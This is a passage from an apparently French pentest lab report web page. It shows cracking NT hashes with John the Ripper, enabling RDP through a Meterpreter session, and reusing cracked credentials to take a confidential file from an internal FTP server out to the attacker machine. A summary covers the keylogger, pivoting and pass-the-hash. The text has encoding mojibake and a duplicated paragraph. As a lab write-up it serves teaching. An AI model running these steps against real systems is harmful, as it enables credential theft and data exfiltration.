        Pour lancer le cassage des mots de passes hach√©s contenus dans le fichier, le pirate saisit la
        commande suivante:
      </p>
      <!--CODE-->
      <div class="center">
        <figure class="ray-code">
          <header class="ray-header">
            <span class="dot red"></span>
            <span class="dot yellow"></span>
            <span class="dot green"></span>
            <span class="title">bash</span>
          </header>
          <pre><code class="language-bash">$ john --format=NT ~/Documents/20250812163411_default_10.10.10.2_windows.hashes_283651.txt</code></pre>
        </figure>
      </div>
      <!--CE1-->
      <img src="/monvirtuallab-site/assets/CE1-BiZ4cmm1.png" width="750" />
      <figcaption>
        Figure 81 ‚Äì Cassage des mots de passe hach√©s √† l‚Äôaide de l‚Äôoption ‚Äìformat
      </figcaption>
      <p>√Ä l‚Äôaide de l‚Äôoption <strong>-show</strong>, l‚Äôattaquant peut d√©sormais afficher les mots de passe en clair:</p>
      <!--CODE-->
      <div class="center">
        <figure class="ray-code">
          <header class="ray-header">
            <span class="dot red"></span>
            <span class="dot yellow"></span>
            <span class="dot green"></span>
            <span class="title">bash</span>
          </header>
          <pre><code class="language-bash">$ john --show --format=NT 
~/Documents/20250812163411_default_10.10.10.2_windows.hashes_283651.txt</code></pre>
        </figure>
      </div>
      <!--CE2-->
      <img src="/monvirtuallab-site/assets/CE2-DGjaeGY3.png" width="750" />
      <figcaption>
        Figure 82 ‚Äì Affichage des mots de passes hach√©s en clair √† l‚Äôaide de l‚Äôoption ‚Äìshow
      </figcaption>
      <p>
        Le pirate constate que l‚Äôutilisateur vagrant est pr√©sent √† la fois sur la machine Windows 2008
        (10.10.10.2) et sur la machine cach√©e (192.168.100.3).
        Ce compte sera donc utilis√© pour tenter une connexion au serveur FTP.
      </p>
      <p>
        Pour cela, le pirate active √† distance une session sur la machine Windows 2008 via le Meterpreter
        puis saisit manuellement les identifiants trouv√©s pour se connecter au serveur FTP.
      </p>   
      
      <a href="#menu-rapport" class="btn" style="background: #38b4ff">
        ‚¨ÖÔ∏è Revenir au menu du rapport
      </a>
    </div>
      <!---->
      <div class="section content-section" id="graphique">
        <h2>üíª Activation du contr√¥le √† distance en mode graphique sur la machine compromise</h2>
        <!---->
        <p>Le pirate souhaite √©tablir une session graphique √† distance sur la machine compromise. Pour ce
        faire, il commence par identifier le num√©ro de session afin de s‚Äôy connecter.</p>
        <!---->
        <h3>1. Acc√®s au serveur FTP depuis la machine compromise</h3>
        <p>Les commandes suivantes sont ex√©cut√©es:</p>
        <!--CODE-->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">msf6 > sessions
msf6 > sessions -i 1
</code></pre>
          </figure>
        </div>
        <!--CE1-->
        <img src="/monvirtuallab-site/assets/CE1-Dzb8rJtY.png" width="750" />
        <figcaption>
          Figure 83 ‚Äì R√©cup√©ration du num√©ro de session et connexion √† la session avec la commande <strong>sessions</strong>
        </figcaption>
        <p>
          Une fois connect√©, il charge le module enable_rdp, qui active le Bureau √† distance via le protocole
          RDP. Selon les auteurs de Metasploit: The Penetration Tester‚Äôs Guide, 2e √©dition, ce module permet de
          cr√©er un tunnel pour la communication graphique et d‚Äôinteragir avec le bureau de la cible.
        </p>
        <!--CODE-->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">meterpreter > run post/windows/manage/enable_rdp</code></pre>
          </figure>
        </div>
        <!--CE2-->
        <img src="/monvirtuallab-site/assets/CE2-BpIlsiA9.png" width="750" />
        <figcaption>
          Figure 84 ‚Äì Activation du Bureau √† distance avec <strong>enable_rdp</strong>
        </figcaption>
        <p>Depuis le terminal Kali Linux, il utilise ensuite les identifiants du compte vagrant pour tenter
          une connexion graphique au Bureau distant de la machine Windows 2008 compromise avec l‚Äôoutil
          rdesktop:
        </p>
        <!--CODE-->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">$: sudo rdesktop 10.10.10.2 -u vagrant -p vagrant</code></pre>
          </figure>
        </div>
        <!--CE3-->
        <img src="/monvirtuallab-site/assets/CE3-DdK0q3CG.png" width="750" />
        <figcaption>
          Figure 85 ‚Äì Connexion graphique au Bureau distant via <strong>rdesktop</strong>
        </figcaption>
        <p>Une fois connect√©, le pirate pourra tenter de s‚Äôintroduire dans le serveur FTP avec les identifiants
          du compte vagrant.</p>
        <p>
          Une fois connect√©, il charge le module enable_rdp, qui active le Bureau √† distance via le protocole
          RDP. Selon les auteurs de Metasploit: The Penetration Tester‚Äôs Guide, 2e √©dition, ce module permet de
          cr√©er un tunnel pour la communication graphique et d‚Äôinteragir avec le bureau de la cible.
        </p>
        <!---->
        <h3>2. Acc√®s au serveur FTP depuis la machine compromise</h3>
        <!--CODE-->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">C:\Users\vagrant>ftp 192.168.100.3
User <192.168.100.3:<none>>: vagrant
Password: vagrant
</code></pre>
          </figure>
        </div>
        <!--CE4-->
        <img src="/monvirtuallab-site/assets/CE4-DPg_YeYC.png" width="750" />
        <figcaption>
          Figure 86 ‚Äì Connexion au serveur FTP √† l‚Äôaide du compte <strong>texvagrant</strong>
        </figcaption>
        <p>T√©l√©chargement du fichier √† l‚Äôaide de la commande get pr√©sent dans le dossier projections_Fi
        pr√©sent dans le fichier <strong>/home/vagrant</strong>.</p>
        <!--CODE-->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">ftp> pwd
ftp> ls
ftp> cd projections_Fi
ftp> ls
ftp> get Document_confidentiel.rtf
</code></pre>
          </figure>
        </div>
        <!--CE5-->
        <img src="/monvirtuallab-site/assets/CE5-CfEVNwnm.png" width="750" />
        <figcaption>
          Figure 86 ‚Äì Recherche du dossier contenant le document puis t√©l√©chargement de celui-ci
        </figcaption>
        <p>Depuis le Meterpreter, le pirate lance le shell pour pouvoir consulter le syst√®me de fichiers de la
          machine compromise.</p>
        <!--CODE-->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">meterpreter > shell
c:\wamp\bin\mysql5.5.20\data>cd c:\Users\vagrant
</code></pre>
          </figure>
        </div>
        <!--CE6-->
        <img src="/monvirtuallab-site/assets/CE6-CT06fVg2.png" width="750" />
        <figcaption>
          Figure 87 ‚Äì D√©marrage du Shell via le Meterpreter sur la machine compromise
        </figcaption>  
        <p>Le pirate s‚Äôassure que le t√©l√©chargement est bien effectif en consultant √† l‚Äôaide de la commande <strong>ls</strong>,
        le dossier vagrant pr√©sent r√©pertoire utilisateur.</p>     
        <!--CODE-->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">c:\Users\vagrant>ls</code></pre>
          </figure>
        </div>
        <!--CE7-->
        <img src="/monvirtuallab-site/assets/CE7-DRuFgtPu.png" width="750" />
        <figcaption>
          Figure 88 ‚Äì Commande ls pour lister le syst√®me de fichiers de la machine compromise
        </figcaption>
        <!--CE8-->
        <img src="/monvirtuallab-site/assets/CE8-DmrfBxkk.png" width="750" />
        <figcaption>
          Figure 89 ‚Äì Commande ls pour lister le syst√®me de fichiers de la machine compromise
        </figcaption>
        <p>Depuis le Meterpreter, le pirate va t√©l√©charger le fichier depuis la machine compromise le document √† l‚Äôaide de la commande <strong>sownload</strong>.</p>
        <!--CODE-->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">meterpreter > download "C:\Users\vagrant\Document_confidentiel.rtf" /home/vagrant</code></pre>
          </figure>
        </div>
        <!--CE9-->
        <img src="/monvirtuallab-site/assets/CE9-BbdZcMOi.png" width="750" />
        <figcaption>
          Figure 88 ‚Äì T√©l√©chargement du fichier depuis la machine compromise via le Meterpreter
        </figcaption>
        <p>
          La commande <strong>ls -l</strong>, permet au pirate de s‚Äôassurer que le fichier est bien pr√©sent sur sa machine.
        </p>
        <!--CODE-->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">ls -l</code></pre>
          </figure>
        </div>
        <!--CE10-->
        <img src="/monvirtuallab-site/assets/CE10-DF7Da4K2.png" width="750" />
        <figcaption>
          Figure 89 ‚Äì Commande ls pour lister le syst√®me de fichiers de la machine compromise
        </figcaption>
        <p>Afin de v√©rifier la lisibilit√© du document, le pirate utilise la commande cat pour en afficher le
          contenu directement dans le terminal. Rappelons que ce document aurait √©galement pu √™tre consult√©
          avant son t√©l√©chargement depuis le serveur FTP, en utilisant la commande <strong>get <nom_du_fichier> -</strong>.</p>
        <!--CE10_5-->
        <img src="/monvirtuallab-site/assets/CE10_5-Vp68c116.png" width="500" />
        <figcaption>
          Figure 90
        </figcaption>
         <!--CODE-->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">$: cat Document_confidentiel.rtf</code></pre>
          </figure>
        </div>
        <!--CE11-->
        <img src="/monvirtuallab-site/assets/CE11-DZkLFeKm.png" width="750" />
        <figcaption>
          Figure 91 ‚Äì Visualisation du document dans le terminal avec cat - partie 1
        </figcaption>
        <!--CE12-->
        <img src="/monvirtuallab-site/assets/CE12-BNps6dsu.png" width="750" />
        <figcaption>
          Figure 92 ‚Äì Visualisation du document dans le terminal avec cat - partie 2
        </figcaption>
        <p>Ensuite, le pirate d√©place √† l‚Äôaide de la commande mv le document dans le dossier partag√© entre sa
          machine virtuelle Kali Linux et son ordinateur h√¥te sous Windows 11.</p>
        <!--CODE-->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">$ mv Document_confidentiel.rtf /media/sf_METASPLOIT6</code></pre>
          </figure>
        </div>
        <!--CE13-->
        <img src="/monvirtuallab-site/assets/CE13-C23rySPg.png" width="750" />
        <figcaption>
          Figure 93 ‚Äì Le document est d√©plac√© vers le dossier partag√©
        </figcaption>
        <!--CE14-->
        <img src="/monvirtuallab-site/assets/CE14-Bs7sfamF.png" width="750" />
        <figcaption>
          Figure 94 ‚Äì Le dossier METASPLOIT6 est partag√© entre la machine virtuelle Kali Linux et l‚Äôh√¥te Windows 11
        </figcaption>
        <p>Le document au format <strong>.rtf</strong> a √©t√© correctement transf√©r√© sur la machine h√¥te gr√¢ce au dossier
          partag√© configur√© entre la machine virtuelle Kali Linux et l‚Äôh√¥te Windows 11.</p>
        <!--CE15-->
        <img src="/monvirtuallab-site/assets/CE15-Sa03-nSV.png" width="750" />
        <figcaption>
          Figure 95
        </figcaption>
        <p>Une fois le fichier transf√©r√© sur la machine h√¥te, le pirate l‚Äôouvre avec son √©diteur de texte OpenOffice afin d‚Äôen prendre connaissance.</p>
        <!--CE16-->
        <img src="/monvirtuallab-site/assets/CE16-Brq1pXGT.png" width="750" />
        <figcaption>
          Figure 96 - Ouverture du document vol√© avec OpenOffice
        </figcaption>
        <a href="#menu-rapport" class="btn" style="background: #38b4ff">
          ‚¨ÖÔ∏è Revenir au menu du rapport
        </a>
      </div>
      <div class="section content-section" id="synth">
        <h2>üìã Synth√®se</h2>
        <!---->
        <p>
          Apr√®s avoir compromis la machine Windows, le hacker a obtenu des informations d√©terminantes 
          gr√¢ce √† un enregistreur de frappes. Une salari√© de l'entreprise pr√©cisait dans un document texte
          la localisation d'un document hautement confidentiel. 
        </p>
        <p>
          Le pirate a alors entrepris de scanner le r√©seau interne √† l‚Äôaide de l‚Äôoutil arp-scanner, afin d‚Äôidentifier
          les h√¥tes actifs. L‚Äôobjectif √©tait d‚Äôenvoyer des requ√™tes ARP et d‚Äôobtenir, pour chaque machine d√©tect√©e,
          son adresse IP et son adresse MAC. Ce scan a confirm√© l'existence d'une machine sur un r√©seau diff√©rent.       </p>
        </p>
        <p>
          Pour acc√©der √† cette machine le hacker a proc√©d√© comme suit:
          <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
            <li><strong>Cr√©ation d‚Äôune route</strong>: permettant d‚Äôacc√©der au r√©seau interne via la machine compromise, en
            utilisant le module autoroute afin d‚Äôatteindre l‚Äôh√¥te cach√©.</li>
            <li><strong>Mise en place d‚Äôun proxy</strong>: dredirigeant le trafic local (127.0.0.1) vers la machine interne, √©coutant
            par d√©faut sur le port 1080 de la machine attaquante.</li>
            <li><strong>Utilisation de l'outil Proxychains</strong>: comme client avec Nmap, de mani√®re √† ce que tout le trafic TCP/UDP passe via 127.0.0.1:1080,
            transite par la machine compromise, puis soit redirig√© vers le r√©seau interne.</li>
          </ul>
        </p>
        <p>
          La premi√®re attaque brute force sur le serveur FTP de l‚Äôordinateur cach√© √©choua apr√®s pr√®s de 48
          heures d‚Äôex√©cution, jug√©e inefficace. Le hacker opta alors pour une seconde attaque par brute force
          ciblant cette fois un serveur Tomcat. Cependant, l‚Äôop√©ration fut interrompue avant son d√©marrage,
          conduisant √† v√©rifier l‚Äôaccessibilit√© du port concern√©. Un scan nmap r√©v√©la que le port 8180 avait le
          statut filtered, laissant supposer un filtrage ou un blocage par pare-feu.    
        </p>
        <p>
          L‚Äôattaquant tenta alors une nouvelle approche : l‚Äôextraction des hachages de mots de passe de la
          machine Windows Server 2008 R2 Standard compromise, via le module smart_hashdump. L‚Äôobjectif √©tait
          d‚Äôappliquer la technique ¬´ pass the hash ¬ª. Cette m√©thode exploite une faiblesse 18 du protocole NTLM,
          qui permet d‚Äôutiliser directement les hachages en lieu et place des mots de passe pour s‚Äôauthentifier.
          Le hacker utilisa le module windows/smb/psexec pour mettre en ≈ìuvre cette technique, mais
          √©choua une nouvelle fois. Il se tourna alors vers un d√©chiffrement des hachages √† l‚Äôaide de John
          the Ripper.
        </p>
        <p>
          Pour ce faire, il r√©cup√©ra d‚Äôabord, via la commande creds, les identifiants trouv√©s et
          associ√©s aux machines cibl√©es. L‚Äôanalyse montra que trois entr√©es correspondaient √† la machine cach√©e
          (192.168.100.3). Apr√®s avoir cass√© les mots de passe, il constata que l‚Äôutilisateur vagrant √©tait pr√©sent
          √† la fois sur Windows 2008 (10.10.10.2) et sur la machine interne.
        </p>
        <p>
          Ce compte fut utilis√© pour se connecter au bureau √† distance √† Windows 2008 ainsi qu‚Äôau serveur
          FTP interne. Depuis sa session Meterpreter, le pirate proc√©da comme suit:
          <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
            <li><strong>Activation du Bureau √† distance</strong>: via le module enable_rdp.</li>
            <li><strong>Connexion graphique √† l'ordinateur Windows 2008</strong> en utilisant rdesktop 
              depuis Kali Linux avec les identifiants vagrant</li>
            <li><strong>Connexion au serveur FTP interne depuis l'interface graphique de l'ordinateur compromis</strong>
              avec les m√™me identifiants vagrant.</li>
            <li><strong>T√©l√©chargement du fichier cible</strong> situ√© dans /home/vagrant via la commande get.</li>
            <li><strong>Lancement d‚Äôun shell depuis la session Meterpreter</strong>pour ex√©cuter la commande download 
              et t√©l√©charger le fichier sur la machine d‚Äôattaque.</li>
            <li><strong>V√©rification de la lisibilit√© du fichier cible avec cat directement dans la session Meterpreter</strong></li>
          </ul>
        </p>
        <h2>üéØ Conclusion</h2>
        <p>
            Cette simulation met en √©vidence la complexit√© de la mise en place d‚Äôun laboratoire de pentesting
          et les difficult√©s rencontr√©es dans ce type d‚Äôop√©ration. Dans un contexte r√©el, un pirate n‚Äôex√©cuterait
          probablement pas ces actions manuellement: par souci de rapidit√© et pour r√©duire les risques de
          d√©tection, il privil√©gierait l‚Äôemploi de scripts automatis√©s, adapt√©s aux r√©sultats obtenus au fil des
          attaques.
        </p>
        <!---->
        <a href="#menu-rapport" class="btn" style="background: #38b4ff">
          ‚¨ÖÔ∏è Revenir au menu du rapport
        </a>
      </div>
      <!---->
        
      <!---->
      
      <div class="section tool-card tool-toggle">
        <a href="https://github.com/idom97" class="btn secondary-btn"
          >‚≠ê Mes autres projets sur GitHub</a
        >
      </div>
    </div>
    <div class="footer">
      <p style="text-align: center; margin-top: 0.5rem; font-size: 0.9rem">
        üîê Les techniques pr√©sent√©es sont destin√©es uniquement √† des fins
        √©ducatives et doivent √™tre utilis√©es de mani√®re responsable.
      </p>
    </div>
  </body>
</html>


